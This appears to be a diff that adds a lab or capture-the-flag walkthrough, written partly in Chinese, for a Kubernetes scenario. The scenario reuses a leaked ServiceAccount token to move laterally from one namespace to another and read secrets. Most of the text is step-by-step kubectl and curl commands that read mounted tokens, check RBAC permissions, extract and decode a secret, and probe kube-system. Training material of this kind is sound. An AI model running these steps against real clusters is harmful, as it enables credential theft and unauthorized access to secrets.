@@ -1,0 +1,160 @@
+# K8S-13: SA Token Cross-Namespace Lateral
+
+## 场景信息
+
+| 字段 | 值 |
+|---|---|
+| ID | K8S-13 |
+| 名称 | SA Token Cross-Namespace Lateral |
+| 技术/CVE | N/A (RBAC lateral) |
+| 难度 | L2 |
+| 交付方式 | KIND / Kubernetes |
+| 入口 | KIND 集群内入口（无固定宿主端口） |
+
+## 场景概述
+- 技术：N/A (RBAC lateral)
+- 难度：L2
+- 交付方式：k8s
+## 攻击路径与利用步骤
+
+## Overview
+| Property | Value |
+|----------|-------|
+| CVE/Technique | N/A (RBAC lateral movement) -- leaked SA token across namespaces |
+| Difficulty | L2 |
+| Type | k8s (KIND cluster) |
+| Cluster Name | cve-k8s-13-sa-cross |
+| Flag Location | Secret `flag-secret` in namespace `ns-beta` |
+
+## Attack Path Summary
+1. Two namespaces: `ns-alpha` (attacker's initial foothold) and `ns-beta` (target)
+2. A ServiceAccount `target-reader` in `ns-beta` has `get/list` on secrets
+3. The token for `target-reader` is leaked as a Secret named `leaked-token` in `ns-alpha`
+4. An attacker pod in `ns-alpha` discovers the leaked token via environment variable
+5. Use the leaked token to authenticate as `target-reader` and read `flag-secret` in `ns-beta`
+
+## Prerequisites
+- kubectl access to KIND cluster `cve-k8s-13-sa-cross`
+- Pod name: `attacker-pod` in namespace `ns-alpha`
+- Tools: kubectl (or curl + jq for API access)
+
+## Step-by-Step Exploitation
+
+### Step 1: Initial Foothold
+Exec into the attacker pod in `ns-alpha`:
+
+```bash
+kubectl exec -it attacker-pod -n ns-alpha -- sh
+```
+
+### Step 2: Discover the Leaked Token
+```bash
+# Check environment variables for the leaked token
+env | grep LEAKED
+# Expected: LEAKED_TOKEN=<token_value>
+
+# Or check secret files in the pod
+ls -la /var/run/secrets/
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Extract the leaked token
+LEAKED_TOKEN=$(env | grep LEAKED_TOKEN | cut -d= -f2)
+echo $LEAKED_TOKEN
+```
+
+### Step 3: Verify the Token's Permissions
+```bash
+# Use kubectl with the leaked token
+kubectl --token=$LEAKED_TOKEN auth whoami
+# Expected: shows the target-reader SA in ns-beta
+
+# Check what the token can do
+kubectl --token=$LEAKED_TOKEN auth can-i get secrets
+kubectl --token=$LEAKED_TOKEN auth can-i list secrets -n ns-beta
+kubectl --token=$LEAKED_TOKEN auth can-i get secrets -n ns-beta
+```
+
+### Step 4: Read the Flag Secret in ns-beta
+```bash
+# List secrets in ns-beta
+kubectl --token=$LEAKED_TOKEN get secrets -n ns-beta
+# Expected:
+# NAME                   TYPE     DATA   AGE
+# flag-secret            Opaque   1      ...
+# default-token-xxxxx    kubernetes.io/service-account-token   3      ...
+
+# Extract the flag
+kubectl --token=$LEAKED_TOKEN get secret flag-secret -n ns-beta \
+    -o jsonpath='{.data.flag}' | base64 -d
+# Expected: flag{k8s-13-*}
+```
+
+### Step 5: Alternative -- Direct API Access
+If kubectl is not available inside the pod, use curl with the token:
+
+```bash
+# Set up the API server and token
+APISERVER="https://kubernetes.default.svc"
+TOKEN=$(env | grep LEAKED_TOKEN | cut -d= -f2)
+
+# Get the CA cert
+CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Query the API directly
+curl -s --cacert $CA_CERT --header "Authorization: Bearer $TOKEN" \
+    $APISERVER/api/v1/namespaces/ns-beta/secrets/
+# Expected: JSON with all secrets in ns-beta
+
+# Extract the flag from the JSON response
+curl -s --cacert $CA_CERT --header "Authorization: Bearer $TOKEN" \
+    $APISERVER/api/v1/namespaces/ns-beta/secrets/flag-secret | \
+    python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())"
+```
+
+### Step 6: Explore Further with the Leaked Token
+```bash
+# What else can the target-reader SA do?
+kubectl --token=$TOKEN auth can-i --list
+
+# Try other namespaces
+kubectl --token=$TOKEN get secrets -n ns-alpha
+kubectl --token=$TOKEN get secrets -n kube-system
+```
+
+### Step 7: Capture Flag
+- Flag format: `flag{k8s-13-*}`
+- Flag location: Secret `flag-secret` in namespace `ns-beta`
+- Access requirements: leaked SA token with secrets read permissions in `ns-beta`
+- Expected output: `flag{k8s-13-default}` (or custom value from `CVE_FLAG`)
+
+## Verification Commands
+```bash
+# Verify the cluster is deployed
+kubectl cluster-info --context kind-cve-k8s-13-sa-cross
+
+# Verify namespaces exist
+kubectl get ns ns-alpha ns-beta
+
+# Verify the attacker pod is running
+kubectl get pod attacker-pod -n ns-alpha
+# Expected: Running
+
+# Verify the leaked token secret exists
+kubectl get secret leaked-token -n ns-alpha
+
+# Verify the flag secret exists
+kubectl get secret flag-secret -n ns-beta
+```
+
+## 此场景利用了哪些知识
+
+| 规划维度 | 所需知识 |
+|---|---|
+| 环境与访问 | ServiceAccount JWTs, Kubernetes API RBAC, namespaces |
+| 侦察与前置条件 | Mounted token discovery and cross-namespace authorization checks |
+| 核心漏洞与利用 | Reuse an over-permitted ServiceAccount token |
+| 权限、横向或影响 | Lateral movement across namespaces |
+| 验证 | Read the target namespace flag/secret |
+
+## 修复建议
+升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
